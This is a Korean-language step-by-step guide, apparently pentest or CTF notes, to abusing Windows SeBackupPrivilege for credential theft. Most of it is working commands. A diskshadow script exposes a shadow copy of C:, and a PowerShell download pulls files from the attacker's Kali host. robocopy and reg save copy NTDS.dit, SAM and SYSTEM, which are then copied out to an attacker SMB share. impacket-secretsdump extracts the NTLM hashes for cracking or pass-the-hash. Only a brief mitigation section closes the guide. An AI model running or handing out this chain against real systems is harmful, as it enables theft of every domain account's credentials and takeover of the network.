

# SeBackupPrivilege를 이용한 시스템 파일 탈취 가이드

`SeBackupPrivilege`는 이름 그대로 시스템 백업을 위해 설계된 권한입니다. 이 권한을 가진 사용자는 파일의 접근 제어 목록(ACL)에 상관없이 시스템의 모든 파일을 읽을 수 있습니다. 이 때문에 `SYSTEM`과 `SAM` 레지스트리 하이브, 그리고 도메인 컨트롤러의 `NTDS.dit` 파일과 같은 치명적인 시스템 파일을 탈취하는 데 악용될 수 있습니다.
`SeRestorePrivilege` 권한이 있어도 사용 가능함.

https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f

### **공격 원리: 볼륨 섀도 복사본 (Volume Shadow Copy)**

`NTDS.dit`나 `SAM` 파일은 운영체제가 항상 사용 중이라 파일을 잠그고(Lock) 있기 때문에, `SeBackupPrivilege`가 있더라도 직접 복사할 수는 없습니다. 이 잠금을 우회하기 위해 **볼륨 섀도 복사본(VSS)** 기술을 사용합니다.

1.  VSS를 이용해 현재 시스템 드라이브(C:)의 스냅샷(섀도 복사본)을 생성합니다.
2.  이 스냅샷을 새로운 드라이브(예: X:)로 마운트합니다.
3.  스냅샷 내의 파일들은 잠겨있지 않으므로, 마운트된 새 드라이브에서 자유롭게 복사할 수 있습니다.
4. 새로운 드라이브(백업)에 대해서는 더 많은 접근 권한을 갖게 되며, 이 권한을 이용해 최종적으로 `ntds.dit`와 `system.hive` 파일을 확보. 이때 `win-rm`과 같은 도구를 사용해 공격자의 로컬 머신으로 파일을 가져오는 것이 좋음.
5. 파일을 확보한 후에는 해시를 크래킹하거나 Pass-the-Hash 공격 등을 시도할 수 있음.

---

### **1. 취약점 식별**

- **목표:** 현재 사용자가 `SeBackupPrivilege` 권한을 보유하고 있는지 확인합니다.

```powershell(title="현재 세션의 권한 확인")
whoami /priv
```

- **확인 사항:** 출력된 목록에 `SeBackupPrivilege`가 `Enabled` 상태로 있는지 확인합니다.

---

### **2. 단계별 공격 절차**

#### **1단계: `diskshadow` 스크립트 준비**
- 공격자 Kali에서 VSS 생성을 자동화하기 위한 `diskshadow`용 스크립트 파일을 만듭니다.

```ini title="viper.dsh"
# 컨텍스트를 영구적, 비대화형으로 설정
# C: 드라이브를 섀도 복사본 대상으로 추가
# 섀도 복사본 생성
# 생성된 섀도 복사본을 X: 드라이브로 노출

set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

#### **2단계: 파일의 줄 끝 형식(line ending)을 변환
- Unix 형식의 텍스트 파일을 DOS/Windows 형식으로 변환합니다.

```ini title="Kali"
unix2dos viper.dsh
```


#### **3단계: 스크립트 실행 및 파일 복사**
- 준비한 스크립트를 타겟 시스템에 업로드하고 `diskshadow`로 실행하여, 민감한 파일들을 쓰기 가능한 위치(예: `C:\Temp`)로 복사합니다.

```powershell title="타겟: 섀도 복사본 생성 및 파일 복사"
powershell -c iwr -uri http://[kali_ip]/viper.dsh -o viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit

reg save hklm\system c:\windows\temp\system
```

- 이 방법을 더 선호합니다 (하지만 이는 로컬 사용자에게만 해당됩니다. 만약 모든 도메인 사용자의 정보가 필요하다면, `ntds.dit` 파일이 필요합니다)

```powershell
cd c:\windows\tasks
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit

reg save hklm\sam c:\Windows\tasks\sam
reg save hklm\system c:\Windows\tasks\system

# kali에서 smbserver 오픈하고 Target에서 연결 후
# Target -> Kali
copy ntds.dit,sam,system \\[kali_ip]\share\

# Kali -> Target
# copy \\[kali_ip]\share\test.txt
```

#### **4단계: 파일 유출 및 해시 덤프**
- 복사된 `ntds.dit`, `SYSTEM`, `SAM` 파일을 공격자 머신으로 다운로드합니다.
- `impacket-secretsdump`를 사용하여 파일로부터 모든 계정의 NTLM 해시를 추출합니다.

```bash(title="공격자: secretsdump로 해시 추출")
# 도메인 컨트롤러에서 탈취한 경우
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 일반 시스템에서 탈취한 경우
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -sam sam -system system local
```

---

### **3. 방어 (Mitigation)**

- **최소 권한의 원칙:** `SeBackupPrivilege`는 백업 솔루션이나 시스템 관리자 등 반드시 필요한 계정에만 부여해야 합니다.
- **모니터링:** `diskshadow.exe`의 실행이나 VSS 관련 이벤트 로그(ID 7001)를 모니터링하여 비정상적인 백업 활동을 탐지할 수 있습니다.

